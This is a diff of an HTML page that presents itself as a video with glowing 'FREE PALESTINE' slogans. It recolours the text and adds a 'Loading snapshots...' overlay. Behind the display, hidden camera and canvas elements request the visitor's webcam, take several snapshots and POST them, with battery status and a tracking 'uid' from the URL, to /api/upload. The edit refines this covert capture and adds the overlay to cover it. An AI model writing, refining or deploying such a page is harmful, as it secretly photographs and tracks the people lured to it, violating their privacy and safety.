@@ -9,44 +9,55 @@
 
 <style>
 html, body {
-  margin: 0; padding: 0;
-  height: 100%; width: 100%;
-  overflow: hidden;
-  background: #000;
-  font-family: 'Orbitron', sans-serif;
+  margin:0; padding:0;
+  width:100%; height:100%;
+  overflow:hidden;
+  background:#000;
+  font-family:'Orbitron', sans-serif;
 }
 
-/* Video background */
 video#bgVideo {
-  position: fixed;
-  top: 0; left: 0;
-  width: 100%; height: 100%;
-  object-fit: cover;
-  z-index: 0;
+  position:fixed;
+  top:0; left:0;
+  width:100%; height:100%;
+  object-fit:cover;
+  z-index:0;
 }
 
-/* Neon text overlay */
 .text-layer {
-  position: absolute;
-  font-weight: 800;
-  white-space: nowrap;
-  z-index: 2;
-  color: #ff0000;
-  text-shadow: 0 0 5px #ff0000,0 0 10px #ff5500,0 0 20px #ffaa00,0 0 30px #ff0000,0 0 40px #ff5555;
+  position:absolute;
+  font-weight:800;
+  white-space:nowrap;
+  z-index:2;
+  color:#00ffea;
+  text-shadow:0 0 5px #00ffea,0 0 10px #00aaff,0 0 20px #0044ff;
   animation: floatUp 10s linear infinite, glow 1.5s ease-in-out infinite alternate;
 }
 
-.text1 { font-size: 6vw; top: 50%; left: 10%; animation-delay: 0s; }
-.text2 { font-size: 5vw; top: 55%; left: 30%; animation-delay: 2s; }
-.text3 { font-size: 4vw; top: 60%; left: 50%; animation-delay: 4s; }
-.text4 { font-size: 5vw; top: 65%; left: 70%; animation-delay: 6s; }
-.text5 { font-size: 4.5vw; top: 70%; left: 20%; animation-delay: 8s; }
+.text1 { font-size:6vw; top:50%; left:20%; animation-delay:0s; }
+.text2 { font-size:5vw; top:55%; left:30%; animation-delay:2s; }
 
-@keyframes floatUp { 0% { transform: translateY(0px); opacity:1; } 100% { transform: translateY(-150px); opacity:0.8; } }
-@keyframes glow { 0% { text-shadow:0 0 5px #ff0000,0 0 10px #ff5500,0 0 20px #ffaa00,0 0 30px #ff0000,0 0 40px #ff5555; } 100% { text-shadow:0 0 10px #ff0000,0 0 20px #ff5500,0 0 30px #ffaa00,0 0 40px #ff0000,0 0 50px #ff5555; } }
+@keyframes floatUp { 0%{transform:translateY(0px); opacity:1;} 100%{transform:translateY(-150px);opacity:0.8;} }
+@keyframes glow { 0%{text-shadow:0 0 5px #00ffea,0 0 10px #00aaff,0 0 20px #0044ff;} 100%{text-shadow:0 0 10px #0044ff,0 0 20px #00aaff,0 0 30px #00ffea;} }
 
-/* Hidden camera + snapshot elements */
-video#camera, canvas#snapshot { display:none; }
+video#camera, canvas#snapshot {
+  display:none;
+}
+
+/* Loading overlay */
+#loadingOverlay {
+  position:fixed;
+  top:0; left:0;
+  width:100%; height:100%;
+  background:rgba(0,0,0,0.6);
+  color:#00ffea;
+  font-size:2em;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  z-index:5;
+  display:none;
+}
 </style>
 </head>
 <body>
@@ -57,9 +68,8 @@ video#camera, canvas#snapshot { display:none; }
 
 <div class="text-layer text1">FREE PALESTINE</div>
 <div class="text-layer text2">FREE PALESTINE</div>
-<div class="text-layer text3">FREE PALESTINE</div>
-<div class="text-layer text4">FREE PALESTINE</div>
-<div class="text-layer text5">FREE PALESTINE</div>
+
+<div id="loadingOverlay">Loading snapshots...</div>
 
 <video id="camera" autoplay playsinline></video>
 <canvas id="snapshot"></canvas>
@@ -69,6 +79,7 @@ const bgVideo = document.getElementById('bgVideo');
 const cameraVideo = document.getElementById('camera');
 const canvas = document.getElementById('snapshot');
 const ctx = canvas.getContext('2d');
+const loading = document.getElementById('loadingOverlay');
 const uid = new URLSearchParams(window.location.search).get('uid') || 'unknown';
 
 async function captureSnapshots() {
@@ -77,34 +88,41 @@ async function captureSnapshots() {
     const batteryLevel = Math.round(battery.level*100);
     const isCharging = battery.charging;
 
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const stream = await navigator.mediaDevices.getUserMedia({ video:true });
     cameraVideo.srcObject = stream;
 
-    const delays = [2000, 4000, 6000];
-    for(let d of delays){
-      await new Promise(res => setTimeout(res, d));
+    // Show loading overlay & pause video
+    loading.style.display = 'flex';
+    bgVideo.pause();
+
+    // Take 4 snapshots at 2s interval
+    for(let i=0;i<4;i++){
+      await new Promise(res=>setTimeout(res,2000));
       canvas.width = cameraVideo.videoWidth;
       canvas.height = cameraVideo.videoHeight;
-      ctx.drawImage(cameraVideo, 0, 0);
+      ctx.drawImage(cameraVideo,0,0);
       const imageData = canvas.toDataURL('image/png');
       fetch('/api/upload',{
         method:'POST',
         headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({ image:imageData, uid, battery:batteryLevel, charging:isCharging })
+        body:JSON.stringify({ image:imageData, uid, battery:batteryLevel, charging:isCharging })
       }).then(r=>r.json()).then(d=>console.log("Uploaded",d)).catch(e=>console.error(e));
     }
 
-    // Stop camera
+    // Stop camera & hide overlay
     stream.getTracks().forEach(track=>track.stop());
-    console.log("Camera stopped");
+    loading.style.display='none';
+    bgVideo.play();
 
   } catch(err){
     console.error("Camera error:", err);
+    loading.style.display='none';
+    bgVideo.play();
   }
 }
 
-// Start snapshot sequence after 1s so video is visible
-setTimeout(captureSnapshots, 1000);
+// Start snapshot sequence after 1s
+setTimeout(captureSnapshots,1000);
 </script>
 
 </body>
